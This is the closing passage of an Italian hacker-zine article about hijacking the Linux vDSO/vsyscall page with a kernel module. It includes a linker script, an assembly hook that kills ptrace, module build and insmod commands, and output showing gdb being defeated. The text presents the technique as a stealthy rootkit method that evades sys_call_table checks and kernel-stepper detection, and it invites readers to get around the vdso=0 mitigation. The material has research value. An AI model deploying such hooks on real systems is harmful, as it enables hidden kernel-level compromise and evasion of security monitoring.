+VDSO_PRELINK = (-8192);
+
+SECTIONS
+{
+  . = VDSO_PRELINK + SIZEOF_HEADERS;
+
+  .hash           : { *(.hash) }		:text
+  .gnu.hash       : { *(.gnu.hash) }
+  .dynsym         : { *(.dynsym) }
+  .dynstr         : { *(.dynstr) }
+  .gnu.version    : { *(.gnu.version) }
+  .gnu.version_d  : { *(.gnu.version_d) }
+  .gnu.version_r  : { *(.gnu.version_r) }
+
+  /* This linker script is used both with -r and with -shared.
+     For the layouts to match, we need to skip more than enough
+     space for the dynamic symbol table et al.  If this amount
+     is insufficient, ld -shared will barf.  Just increase it here.  */
+  . = VDSO_PRELINK + 0x400;
+
+  .text           : { *(.text) }		:text =0x90909090
+  .note		  : { *(.note.*) }		:text :note
+  .eh_frame_hdr   : { *(.eh_frame_hdr) }	:text :eh_frame_hdr
+  .eh_frame       : { KEEP (*(.eh_frame)) }	:text
+  .dynamic        : { *(.dynamic) }		:text :dynamic
+  .useless        : {
+  	*(.got.plt) *(.got)
+	*(.data .data.* .gnu.linkonce.d.*)
+	*(.dynbss)
+	*(.bss .bss.* .gnu.linkonce.b.*)
+  }						:text
+}
+
+/*
+ * We must supply the ELF program headers explicitly to get just one
+ * PT_LOAD segment, and set the flags explicitly to make segments read-only.
+ */
+PHDRS
+{
+  text PT_LOAD FILEHDR PHDRS FLAGS(5); /* PF_R|PF_X */
+  dynamic PT_DYNAMIC FLAGS(4); /* PF_R */
+  note PT_NOTE FLAGS(4); /* PF_R */
+  eh_frame_hdr 0x6474e550; /* PT_GNU_EH_FRAME, but ld doesn't match the name */
+}
+
+/*
+ * This controls what symbols we export from the DSO.
+ */
+VERSION
+{
+  LINUX_2.5 {
+    global:
+    	__kernel_vsyscall;
+    	__kernel_sigreturn;
+    	__kernel_rt_sigreturn;
+
+    local: *;
+  };
+}
+
+/* The ELF entry point can be used to set the AT_SYSINFO value.  */
+ENTRY(__kernel_vsyscall);
+<-X->
+
+
+Diamo ora alcune indicazioni sul suo utilizzo. 
+Il file piu' importante di tutto il resto e' sicuramente il Makefile: esso
+si occupa di modificare i template del kernel Linux affinche' contengano il
+codice di hook. Quest'ultimo deve trovarsi in un file di nome hook.S,
+cosi' da essere messo in append a vsyscall-sigreturn.S ed essere richiamato
+da __kernel_vsyscall. Ad esempio, in un semplice scenario in cui si volesse
+disattivare la syscall ptrace, avremmo:
+
+<-| vdso/hook.S |->
+/* insert the syscall hook code here */
+HOOK:
+	cmpl $26,%eax		# sys_ptrace
+	jne .LSTART_vsyscall
+	movl $1,%eax		# sys_exit
+	jmp .LSTART_vsyscall
+<-X->
+
+Questo e' un esempio dimostrativo molto semplice, tuttavia con qualche forma
+di utilita' (vedere anti-debug tricks o anti-symbiotic process execution ;-).
+Vediamolo in funzione: innanzi tutto modifichiamo le seguenti righe in
+vdso_hack.c:
+
+/* modify these paths to resemble your cwd */
+#define MCNAMARA_INCBIN         ".incbin \"/home/sbudella/src/vdso/mcnamara\""
+#define TROY_INCBIN             ".incbin \"/home/sbudella/src/vdso/troy\""
+#define DFLT_INT80_INCBIN       ".incbin \"/home/sbudella/src/vdso/int80.so\""
+#define DFLT_SYSENTER_INCBIN    ".incbin \"/home/sbudella/src/vdso/sysent.so\""
+
+I path devono riflettere la vostra current working directory in maniera 
+assoluta e non relativa; i nomi dei binari restano invariati.
+Successivamente compiliamo e insmodiamo:
+
+sbudella@hannibal:~/src/vdso$ ls
+Makefile       int80.template      vdso_hack.c
+asm-offsets.h  sigreturn.template  vsyscall-note.S
+hook.S         sysenter.template   vsyscall.lds.S
+sbudella@hannibal:~/src/vdso$ make
+[...]
+sbudella@hannibal:~/src/vdso$ grep syscall_pages /boot/System.map
+c07be240 b syscall_pages
+root@hannibal:/home/sbudella/src/vdso# insmod vdso_hack.ko syscall_pages_addr=0xc07be240
+root@hannibal:/home/sbudella/src/vdso#
+
+Proviamo a richiamare la syscall ptrace mediante gdb:
+
+sbudella@hannibal:~$ gdb -q /bin/date
+(no debugging symbols found)
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) run
+Starting program: /bin/date
+sbudella@hannibal:~$
+
+Funge. Nel momento in cui gdb tenta di lanciare il programma esso fallisce
+miseramente invocando sys_exit. Ispezioniamo piu' a fondo:
+
+sbudella@hannibal:~$ ldd /bin/cat
+        linux-gate.so.hacked =>  (0xb7f98000)
+        libc.so.6 => /lib/libc.so.6 (0xb7e64000)
+        /lib/ld-linux.so.2 (0xb7f99000)
+sbudella@hannibal:~$
+
+Il nostro vDSO viene riconosciuto con l'appariscente nome linux-gate.so.hacked.
+Ristabiliamo l'ordine iniziale:
+
+root@hannibal:/home/sbudella/src/vdso# rmmod vdso_hack.ko
+root@hannibal:/home/sbudella/src/vdso# gdb -q /bin/date
+(no debugging symbols found)
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) run
+Starting program: /bin/date
+[Thread debugging using libthread_db enabled]
+[New Thread -1209588032 (LWP 3835)]
+Mon Jul 30 16:57:13 CEST 2007
+
+Program exited normally.
+(gdb) q
+root@hannibal:/home/sbudella/src/vdso#
+
+Non ci sono differenze da applicare nel caso del fix-mapped vDSO.
+Un'ultima considerazione riguarda la compatibilita': i test sono stati fatti
+su Slackware Linux 12 avente kernel versione 2.6.21.5, esclusivamente con
+GNU libc versione 2.6 (pare sia l'unica con supporto al fast system call).
+
+Il lettore piu' accorto dovrebbe notare che l'utilizzo di questa tecnica si
+presta molto bene ai casi in cui si voglia aggirare un ben noto sistema
+di detecting: oramai e' del tutto sconsigliabile manipolare la sys_call_table
+poiche' e' la regione piu' controllata da software di controllo; tuttavia si
+potrebbe obiettare che tali controlli potrebbero di conseguenza essere 
+focalizzati appunto sulla vsyscall page: basterebbe un fingerprint sul vDSO
+originale per riscontrare eventuali anomalie; ma tale problematica riguarda
+qualsiasi rootkit che giaccia allo stesso livello del kernel, che non
+implementi, cioe', alcuna tecnologia di virtualizzazione[5].
+
+Potrebbe invece essere confortante il fatto che la nostra tecnica dovrebbe
+risultare immune ad eventuali tecniche di execution path analysis che 
+utilizzino una qualche forma di kernel stepper[6]: tali strumenti operano in
+modo tale da fare un'attenta osservazione e successivo conteggio di tutte le
+istruzioni eseguite da una syscall service routine; le vecchie tecniche di
+syscall hijacking prevedono nella fattispecie l'alterazione della
+sys_call_table e delle syscall service routine interessate: esse presenteranno
+sempre almeno una istruzione in piu' rispetto a quelle originali, ed e' proprio
+su questo paradigma che si basa il successo di un kernel/hardware stepper.
+E' pur ovvio pero' che nel nostro caso non viene modificata alcuna syscall e
+che il trampoline viene eseguito in user space, da cui l'assunto iniziale.
+
+Attualmente dunque si puo' considerare la tecnica di vsyscall page hijacking
+ragionevolmente stealth, con in piu' il vantaggio dell'ibridazione kernel/user
+space: il lkm proposto e' solo un vettore di attacco comodo, sostituibile
+con altre metodologie (iniezione diretta del codice, ecc), e ricordando le
+considerazioni dell'articolo precedentemente pubblicato dall'autore[7], si
+potrebbe modificare la vDSO region senza affatto intervenire sul kernel.
+
+Bene, credo non ci sia altro da aggiungere. Il lettore ricordi che il metodo 
+piu' semplice per neutralizzare al nascere ogni minaccia legata a questa nuova
+tecnica user/kernel space consiste nel passare al kernel Linux il seguente
+parametro in fase di boot:
+
+	vdso = 0
+
+Tuttavia tale rimedio non sembra convincere pienamente l'autore; infatti:
+
+root@hannibal:/home/sbudella# less /var/log/messages
+[...]
+Jul 30 17:04:25 hannibal kernel: Kernel command line: BOOT_IMAGE=Linux26 ro root=301 vdso=0
+[...]
+
+e nonostante cio':
+
+sbudella@hannibal:~$ cat /proc/self/maps
+[...]
+b7f40000-b7f41000 r-xp b7f40000 00:00 0          [vdso]
+b7f41000-b7f5c000 r-xp 00000000 03:01 12503      /lib/ld-2.6.so
+b7f5c000-b7f5d000 r--p 0001a000 03:01 12503      /lib/ld-2.6.so
+b7f5d000-b7f5e000 rw-p 0001b000 03:01 12503      /lib/ld-2.6.so
+bf9bc000-bf9d1000 rw-p bf9bc000 00:00 0          [stack]
+sbudella@hannibal:~$
+
+Sembra che la vsyscall page venga ugualmente mappata nell'address space della
+vittima, seppur non venga utilizzata come trampolino a kernel space.
+Ma questa e' un'altra storia che esula dagli scopi iniziali dell'articolo.
+Si lascia al lettore come spunto per ricerche future il compito di aggirare
+tale protezione.
+
+***** Saluti.
+
+Un saluto pregno di riconoscenza lo dedico a rookie, lui sa perche':
+"- Allora, cos'e' cambiato? In che modo le cose sono diverse?
+ - Le cose non sono diverse. Le cose sono cose."
+
+A chiunque abbia significato qualcosa per me, coloro i quali sono stati al mio
+fianco negli episodi piu' importanti della mia esistenza ed ora sono andati
+via, per un motivo o per un altro, ognuno per la propria strada:
+
+"But I'm here staring up
+At pictures on the wall
+And where are you,
+You're still stuck inside them all"
+
+***** Riferimenti.
+
+[1] Intel Architecture Software Developer's Manual, Volume 2:
+	Instruction Set Reference
+
+[2] Syscall Redirection Without Modifying the Syscall Table - Silvio Cesare
+
+[3] Linux Kernel Evil Programming Demystified - Dark Angel
+
+[4] Ret onto Ret into Vsyscalls, Ret onto Jmp into Vsyscalls - 
+	Clad Strife, Xdream Blue
+
+[5] SubVirt: Implementing Malware with Virtual Machine -
+        Samuel T. King, Peter M. Chen, Microsoft Research
+
+[6] Execution Path Analysis: Finding Kernel Based Rootkits - Jan K. Rutkowski
+
+[7] Symbiotic Process Execution - sbudella
+
+[*] Understanding the Linux Kernel, 3rd Edition - Daniel P. Bovet, Marco Cesati
+
+[*] Glibc Source Code
+
+[*] Linux Kernel Source Code
+
+
+================================================================================
+------------------------------------[ EOF ]-------------------------------------
+================================================================================
+
